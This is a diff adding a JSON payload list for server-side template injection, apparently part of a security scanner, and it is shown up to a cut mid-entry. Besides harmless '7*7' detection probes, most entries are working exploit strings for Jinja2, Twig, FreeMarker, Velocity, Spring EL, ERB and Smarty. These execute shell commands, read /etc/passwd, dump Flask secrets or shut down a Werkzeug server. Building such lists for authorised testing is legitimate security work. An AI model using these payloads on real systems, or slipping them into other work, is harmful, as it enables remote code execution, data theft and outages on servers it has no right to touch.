@@ -1,0 +1,1256 @@
+{
+  "version": "5.1.0",
+  "category": "ssti",
+  "payloads": [
+    {
+      "id": "ssti.probe.polyglot",
+      "vector": "${{<%[%'\"}}%\\",
+      "description": "Universal SSTI break probe — errors in most engines, confirming template evaluation.",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "owasp": "A03:2021",
+      "confidence": "LOW",
+      "severity": "High",
+      "references": [
+        "https://github.com/payload-box/ssti-advanced-payload-list"
+      ],
+      "tags": [
+        "polyglot",
+        "detection"
+      ]
+    },
+    {
+      "id": "ssti.probe.braces_math",
+      "vector": "{{7*7}}",
+      "description": "Arithmetic probe. Response contains 49 -> Jinja2/Twig/Nunjucks/Handlebars-helpers.",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "owasp": "A03:2021",
+      "confidence": "MEDIUM",
+      "severity": "High",
+      "engines": [
+        "jinja2",
+        "twig",
+        "nunjucks"
+      ],
+      "expected_evidence": [
+        "49"
+      ],
+      "references": [
+        "https://swisskyrepo.github.io/PayloadsAllTheThings/Server%20Side%20Template%20Injection/"
+      ],
+      "tags": [
+        "arithmetic"
+      ]
+    },
+    {
+      "id": "ssti.probe.dollar_brace_math",
+      "vector": "${7*7}",
+      "description": "Arithmetic probe. 49 -> FreeMarker/JSP EL/Spring/Thymeleaf/Groovy.",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "owasp": "A03:2021",
+      "confidence": "MEDIUM",
+      "severity": "High",
+      "engines": [
+        "freemarker",
+        "velocity",
+        "spring",
+        "thymeleaf"
+      ],
+      "expected_evidence": [
+        "49"
+      ],
+      "tags": [
+        "arithmetic"
+      ]
+    },
+    {
+      "id": "ssti.probe.erb_math",
+      "vector": "<%= 7*7 %>",
+      "description": "Arithmetic probe. 49 -> ERB/Ruby, EJS.",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "owasp": "A03:2021",
+      "confidence": "MEDIUM",
+      "severity": "High",
+      "engines": [
+        "erb",
+        "ejs"
+      ],
+      "expected_evidence": [
+        "49"
+      ],
+      "tags": [
+        "arithmetic"
+      ]
+    },
+    {
+      "id": "ssti.probe.hash_brace_math",
+      "vector": "#{7*7}",
+      "description": "Arithmetic probe. 49 -> Ruby (Slim/Haml), Pug interpolation.",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "owasp": "A03:2021",
+      "confidence": "MEDIUM",
+      "severity": "High",
+      "engines": [
+        "ruby",
+        "pug",
+        "slim"
+      ],
+      "expected_evidence": [
+        "49"
+      ],
+      "tags": [
+        "arithmetic"
+      ]
+    },
+    {
+      "id": "ssti.probe.at_brace_math",
+      "vector": "@(7*7)",
+      "description": "Arithmetic probe. 49 -> Razor (.NET).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "owasp": "A03:2021",
+      "confidence": "MEDIUM",
+      "severity": "High",
+      "engines": [
+        "razor"
+      ],
+      "expected_evidence": [
+        "49"
+      ],
+      "tags": [
+        "arithmetic"
+      ]
+    },
+    {
+      "id": "ssti.engineid.string_mult",
+      "vector": "{{7*'7'}}",
+      "description": "Engine disambiguation: 7777777 -> Jinja2, 49 -> Twig.",
+      "context": "engine_id",
+      "cwe": "CWE-1336",
+      "owasp": "A03:2021",
+      "confidence": "LOW",
+      "severity": "High",
+      "engines": [
+        "jinja2",
+        "twig"
+      ],
+      "expected_evidence": [
+        "7777777",
+        "49"
+      ],
+      "tags": [
+        "engine-id"
+      ]
+    },
+    {
+      "id": "ssti.jinja2.config_dump",
+      "vector": "{{config.items()}}",
+      "description": "Jinja2 (Flask) config object dump — leaks SECRET_KEY etc.",
+      "context": "info_leak",
+      "cwe": "CWE-1336",
+      "owasp": "A03:2021",
+      "confidence": "MEDIUM",
+      "severity": "High",
+      "engines": [
+        "jinja2"
+      ],
+      "expected_evidence": [
+        "SECRET_KEY",
+        "SESSION_COOKIE"
+      ],
+      "min_intrusion_level": "low",
+      "tags": [
+        "jinja2",
+        "info-leak"
+      ]
+    },
+    {
+      "id": "ssti.jinja2.rce_popen",
+      "vector": "{{cycler.__init__.__globals__.os.popen('id').read()}}",
+      "description": "Jinja2 sandbox-escape RCE gadget. Loud — high intrusion.",
+      "context": "rce",
+      "cwe": "CWE-94",
+      "owasp": "A03:2021",
+      "confidence": "MEDIUM",
+      "severity": "Critical",
+      "engines": [
+        "jinja2"
+      ],
+      "min_intrusion_level": "high",
+      "expected_evidence": [
+        "uid="
+      ],
+      "references": [
+        "https://hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html"
+      ],
+      "tags": [
+        "jinja2",
+        "rce"
+      ]
+    },
+    {
+      "id": "ssti.twig.rce_filter",
+      "vector": "{{['id']|filter('system')}}",
+      "description": "Twig RCE via the filter() function. High intrusion.",
+      "context": "rce",
+      "cwe": "CWE-94",
+      "owasp": "A03:2021",
+      "confidence": "MEDIUM",
+      "severity": "Critical",
+      "engines": [
+        "twig"
+      ],
+      "min_intrusion_level": "high",
+      "expected_evidence": [
+        "uid="
+      ],
+      "tags": [
+        "twig",
+        "rce"
+      ]
+    },
+    {
+      "id": "ssti.freemarker.rce_exec",
+      "vector": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
+      "description": "FreeMarker RCE via the Execute utility. High intrusion.",
+      "context": "rce",
+      "cwe": "CWE-94",
+      "owasp": "A03:2021",
+      "confidence": "MEDIUM",
+      "severity": "Critical",
+      "engines": [
+        "freemarker"
+      ],
+      "min_intrusion_level": "high",
+      "expected_evidence": [
+        "uid="
+      ],
+      "tags": [
+        "freemarker",
+        "rce"
+      ]
+    },
+    {
+      "id": "ssti.velocity.rce",
+      "vector": "#set($e=\"e\")$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"id\")",
+      "description": "Velocity RCE via reflection. High intrusion.",
+      "context": "rce",
+      "cwe": "CWE-94",
+      "owasp": "A03:2021",
+      "confidence": "MEDIUM",
+      "severity": "Critical",
+      "engines": [
+        "velocity"
+      ],
+      "min_intrusion_level": "high",
+      "tags": [
+        "velocity",
+        "rce"
+      ]
+    },
+    {
+      "id": "ssti.legacy.015aea384e",
+      "vector": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"whoami\")}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.027b19c609",
+      "vector": "{{7*7}}{{7*7}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.066cc0db61",
+      "vector": "{{_context}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.07b8f50e34",
+      "vector": "<script>\\x3csvg/onload=alert(1)\\x3e</script>",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.0cfd08b519",
+      "vector": "${7*7}${7*7}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.13cbb0dca9",
+      "vector": "{{request}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.150c07a0b0",
+      "vector": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"cat /etc/passwd\")}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.15131555bf",
+      "vector": "{{''.__class__.__mro__[2].__subclasses__()}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.169fd553ca",
+      "vector": "{{7*7}}@example.com",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.212102a1ef",
+      "vector": "${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(99))).getInputStream())}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.2165d44b2d",
+      "vector": "${T(java.lang.Runtime).getRuntime().exec('calc')}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.26d1cd00b2",
+      "vector": "{{app.user.username}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.2edef1a4d4",
+      "vector": "{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.303c79815b",
+      "vector": "${{7*7}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.3591fa0646",
+      "vector": "${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.371220a402",
+      "vector": "{{app.request.server.all|join(',')}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.392e161310",
+      "vector": "{{dump(app)}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.3cb3346849",
+      "vector": "{php}echo `id`;{/php}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.3eb6943295",
+      "vector": "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ],
+      "time_based": true
+    },
+    {
+      "id": "ssti.legacy.3f2fb74143",
+      "vector": "{{_self}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.449da319f6",
+      "vector": "{{request.environ}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.44dbf591db",
+      "vector": "{{request.environ['werkzeug.server.shutdown']()}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "Critical",
+      "tags": [
+        "source:legacy"
+      ],
+      "destructive": true,
+      "min_intrusion_level": "high"
+    },
+    {
+      "id": "ssti.legacy.45eb9c179d",
+      "vector": "<%= `id` %>",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.4aecb1b21c",
+      "vector": "{{_self.env.registerUndefinedFilterCallback(\"passthru\")}}{{_self.env.getFilter(\"id\")}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.4ee81e305d",
+      "vector": "{{app.request.cookies.get('foo')}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.4fb246b72b",
+      "vector": "{{app.request.server.get('HTTP_HOST')}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.51c42b597b",
+      "vector": "{{render(controller('AppBundle:Default:index'))}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.54da015ac6",
+      "vector": "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.5a7245a5f0",
+      "vector": "{{dump(_context)}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.5c9463378c",
+      "vector": "{{request.application.__globals__.__builtins__.__import__('os').system('id')}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.5df5f296fd",
+      "vector": "{{ joiner.__init__.__globals__.os.popen('id').read() }}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.5f996ba4c3",
+      "vector": "{{cycler.__init__.__globals__.os.popen('whoami').read()}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.6078beb65a",
+      "vector": "${@print(system('cat /etc/passwd'))}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.61e2e59026",
+      "vector": "{{lipsum.__globals__.__builtins__.__import__('os').popen('id').read()}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.6252b58442",
+      "vector": "{%print(self)%}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.668aac94dd",
+      "vector": "#{7*7}@example.com",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.673fa44828",
+      "vector": "<%= system(\"whoami\") %>",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.6a80f948d8",
+      "vector": "test#{7*7}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.6acc5cefb1",
+      "vector": "${T(java.lang.Runtime).getRuntime().exec('id')}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.6c8505e29c",
+      "vector": "{{_self.env.registerUndefinedFilterCallback(\"system\")}}{{_self.env.getFilter(\"id\")}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.7066e998b1",
+      "vector": "{{app.request.query.get('foo')}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.706b352373",
+      "vector": "${T(java.lang.Runtime).getRuntime().exec('whoami')}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.70c009fca3",
+      "vector": "${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(' ')}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.7194b51932",
+      "vector": "{%print(config)%}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.73801e1197",
+      "vector": "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.7b547767c7",
+      "vector": "{{app.request.request.get('foo')}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.819f199021",
+      "vector": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.83786555f3",
+      "vector": "[#assign ex = 'freemarker.template.utility.Execute'?new()]${ex('id')}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.8c2c6f4895",
+      "vector": "{{config}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.911bbd0a30",
+      "vector": "${@print(system('whoami'))}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.91b3dac50c",
+      "vector": "#set($x=7*7)$x",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.9580ae6d3a",
+      "vector": "<%= system(\"cat /etc/passwd\") %>",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.992a3a750f",
+      "vector": "{{ namespace.__init__.__globals__.os.popen('id').read() }}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.9b2d3e5f7a",
+      "vector": "<%= File.open('/etc/passwd').read %>",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.9b546d6bd8",
+      "vector": "{{_self.env.registerUndefinedFilterCallback(\"shell_exec\")}}{{_self.env.getFilter(\"id\")}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.9bfe14ddbe",
+      "vector": "{{lipsum.__globals__.os.popen('id').read()}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.9cdca2c0f8",
+      "vector": "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.a13eb76bae",
+      "vector": "${7*7}@example.com",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.a32fe03175",
+      "vector": "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.a430cf5f3f",
+      "vector": "{% for item in ().__class__.__bases__[0].__subclasses__() %}{% if item.__name__ == 'catch_warnings' %}{{ item()._module.__builtins__['__import__']('os').popen('id').read() }}{% endif %}{% endfor %}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.ae11477d0b",
+      "vector": "test${7*7}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.b054d47228",
+      "vector": "{{app.session.get('foo')}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.b200d1f6f4",
+      "vector": "{{self}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.b43f30b09b",
+      "vector": "{{app.request.files.get('foo')}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.c4826ff703",
+      "vector": "${@print(md5('test'))}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.c72370e506",
+      "vector": "{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()[0].strip()}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.cabd40edf4",
+      "vector": "{php}echo system('id');{/php}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.cfda91ff40",
+      "vector": "*{7*7}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.d0bba4e76c",
+      "vector": "{{get_flashed_messages.__globals__['current_app'].config}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.da531c5fc8",
+      "vector": "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.dcbcd57ec1",
+      "vector": "<%= system(\"id\") %>",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.de668d1bf4",
+      "vector": "{{['cat /etc/passwd']|filter('system')}}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.df91ab36de",
+      "vector": "{php}phpinfo();{/php}",
+      "description": "Imported from the legacy corpus (generic).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.ee2abc4e63",
+      "vector": "@{7*7}",
+      "description": "Imported from the legacy corpus (detection).",
+      "context": "detection",
+      "cwe": "CWE-1336",
+      "confidence": "LOW",
+      "severity": "High",
+      "tags": [
+        "source:legacy"
+      ]
+    },
+    {
+      "id": "ssti.legacy.ef0073aeab",
